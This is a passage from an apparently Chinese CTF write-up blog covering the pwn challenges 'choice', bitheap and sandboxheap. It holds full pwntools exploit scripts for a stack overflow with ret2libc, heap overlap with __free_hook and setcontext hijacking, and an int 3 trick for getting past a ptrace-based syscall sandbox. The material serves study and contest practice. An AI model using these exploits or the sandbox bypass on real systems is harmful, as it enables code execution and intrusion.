class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;edit?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;power:&#x27;</span>, power)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x170</span>)<br>edit(<span class="hljs-number">1</span>, payload, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>libc_reallo = libcbase + <span class="hljs-number">0x846c0</span><br>onegadget = libcbase + <span class="hljs-number">0xf1117</span><br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>edit(<span class="hljs-number">1</span> ,<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(p64(malloc_hook - <span class="hljs-number">0x23</span>), <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;a&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">11</span> + p64(onegadget) + p64(libc_reallo + <span class="hljs-number">6</span>)<br>add(payload ,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><p>本地复现环境：2.23-0ubuntu11.3_i386</p><p>在此输入时利用最后一个字节即可覆盖nbytes的值，然后在下一次输入时让其栈溢出，最后ret2libc</p><p><img src="/img/3/Screenshot_20221105_104723.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./choice&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>pay = <span class="hljs-string">b&#x27;a&#x27;</span>.ljust(<span class="hljs-number">20</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + <span class="hljs-string">b&#x27;\x50&#x27;</span><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p32(<span class="hljs-number">0x80485bb</span>) + p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>leak = u32(p.recv(<span class="hljs-number">4</span>))<br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, pay)<br>p.sendlineafter(<span class="hljs-string">b&#x27;now&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p32(sys_addr) + <span class="hljs-string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)<br>p.sendafter(<span class="hljs-string">b&#x27;it?&#x27;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>祥云杯2022 sandboxheap和bitheap</title>
    <link href="/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/"/>
    <url>/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/</url>
    
    <content type="html"><![CDATA[<p>我是先写的sandboxheap，开始还以为sandbox文件是多余的，就直接单独拿sandboxheap去写，就在本地打通后，发现远程是有通过sandbox去执行sandboxheap，当时我就没能写出来。</p><p>山重水复疑无路，柳暗花明又一村！没想到bitheap漏洞和sandboxheap一模一样，而且没有sandbox，当时就只写出了bitheap。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这两道题都是一样的漏洞，主要是看懂编辑函数中的溢出和加密：</p><p>如下图将堆块写入数据的大小乘8 ，然后加1；最后是通过基于输入的8个字符去对堆中的一个字节进行位运算，每个字符可以操作堆中一个字节的一位；最后会多出一个字节影响下一个堆块的size</p><p><img src="/img/4/Screenshot_20221105_024929.png"></p><p>如下图sub_C61函数，基于堆块中的字符来位运算，但堆块初始值都是<code>0</code>，最后被写入堆块的也是0  ；如果输入的是<code>\x31</code>字符会让最后被写入堆块的的是1。</p><p><img src="/img/4/Screenshot_20221105_025735.png"></p><h3 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h3><p>kali对这道题使用patchelf会报错，这里我是用ubuntu完成的</p><p>由于溢出的字节只能更改下一个堆块的size的标志位（判断堆块是否被使用），需要对下一个堆块的prev_size和标志位修改，让其释放后进入unsortedbin，然后与上边的unsortedbin合并。</p><img src="/img/4/Screenshot_20221107_060716.png" style="zoom:80%;" /><p>具体写入</p><img src="/img/4/Screenshot_20221107_060903.png" style="zoom:80%;" /><h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><p>利用堆块重叠直接去修改__free_hook为system函数即可。</p><p>完整的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bitheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process([&#x27;./sandbox&#x27;,&#x27;./sandboxheap&#x27;])</span><br><span class="hljs-comment">#p = process(&#x27;./bitheap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;39.106.13.71&#x27;</span>,<span class="hljs-number">42991</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    pay = u64(pay)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">1</span>, key(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">3</span>, key(p64(sys_addr)))<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h3><p>以前都是写调用prctl函数，禁止系统调用开启的沙盒题，但这题目直接使用沙盒程序来保护其它程序。</p><p>利用堆块重叠修改__free_hook到setcontext段上，释放堆块会执行setcontext段上的代码，在此过程中rdi就是被释放堆块堆块的地址，进而劫持rsp。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f5b32c80085</span> &lt;+<span class="hljs-number">53</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa0</span>]<br>   <span class="hljs-number">0x00007f5b32c8008c</span> &lt;+<span class="hljs-number">60</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f5b32c80093</span> &lt;+<span class="hljs-number">67</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f5b32c80097</span> &lt;+<span class="hljs-number">71</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f5b32c8009b</span> &lt;+<span class="hljs-number">75</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f5b32c8009f</span> &lt;+<span class="hljs-number">79</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f5b32c800a3</span> &lt;+<span class="hljs-number">83</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f5b32c800a7</span> &lt;+<span class="hljs-number">87</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa8</span>]<br>   <span class="hljs-number">0x00007f5b32c800ae</span> &lt;+<span class="hljs-number">94</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f5b32c800af</span> &lt;+<span class="hljs-number">95</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f5b32c800b3</span> &lt;+<span class="hljs-number">99</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f5b32c800ba</span> &lt;+<span class="hljs-number">106</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f5b32c800c1</span> &lt;+<span class="hljs-number">113</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f5b32c800c5</span> &lt;+<span class="hljs-number">117</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f5b32c800c9</span> &lt;+<span class="hljs-number">121</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f5b32c800cd</span> &lt;+<span class="hljs-number">125</span>&gt;:<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f5b32c800cf</span> &lt;+<span class="hljs-number">127</span>&gt;:<span class="hljs-keyword">ret</span>    <br></code></pre></td></tr></table></figure><p>最初复现时我想在堆上执行ROP将flag通过orw读出来，但是沙盒程序好像也禁用open之类的系统调用，最后看网上别的师傅写的<a href="https://mp.weixin.qq.com/s/LtC68IafiEA6rAF-cAxb0Q">wp</a>才知道需要通过<code>int 3</code>这个软中断去绕过。</p><h4 id="关于int-3的绕过"><a href="#关于int-3的绕过" class="headerlink" title="关于int 3的绕过"></a>关于int 3的绕过</h4><p>关于int 3的绕过我是看ctftime上关于Sandybox的wp，由于我英语不太好只能理解到这里了。</p><p>sandbox程序fork一个子进程，通过<strong>ptrace</strong>函数跟踪子进程。</p><p>调用ptrace(PTRACE_SYS, pid, 0, signal)使内核在子进程进入和退出系统调用时都将其暂停。</p><p>sandbox程序ida中主要的伪代码（简化）：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">do&#123;<br><span class="hljs-built_in">if </span>( ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL) == -1<br>|| waitpid(v4, 0LL, 0) == -1<br>|| ptrace(PTRACE_GETREGS, v4, 0LL, v8) == -1 )<br>    &#123;<br>       break;<br>    &#125;<br>    <br>    <br>    ………………<br>    //过滤一些系统调用<br>   ………………<br>   <br>   <br>&#125;while ( ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL) != -1<br>         &amp;&amp; waitpid(v4, 0LL, 0) != -1<br>         &amp;&amp; (v10 != 10000 &amp;&amp; v10 != -1 || ptrace(PTRACE_POKEUSER, v4, 80<span class="hljs-class">LL) != -1) );</span><br></code></pre></td></tr></table></figure><ol><li>循环开头处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程进入系统调用；</li><li>中间的代码就是获取当前的系统调用号（rax），过滤一些系统调用；</li><li>循环结尾处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程离开系统调用。</li></ol><p>使用<code>int 3</code>这个软中断后，可以让父进程循环开头处的 ptrace误以为子进程已经进入系统调用，但实际上子进程并未进入系统调用；当子进程真正进入系统调用后，是触发循环结尾处的 ptrace， 事实上ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)并不能判断子进程是进入系统调用还是离开系统调用，这样就绕过了中间对系统调用的过滤。</p><p>使用int 3后：</p><ol><li>循环结尾处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程进入系统调用；</li><li>循环开头处的 ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)、waitpid(v4, 0LL, 0)是等待子进程离开系统调用。</li></ol><p>相当于反转了循环，之后就可以顺利执行接下来的shellcode了。</p><p>完整的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;sandboxheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>p = process([<span class="hljs-string">&#x27;./sandbox&#x27;</span>,<span class="hljs-string">&#x27;./sandboxheap&#x27;</span>])<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span 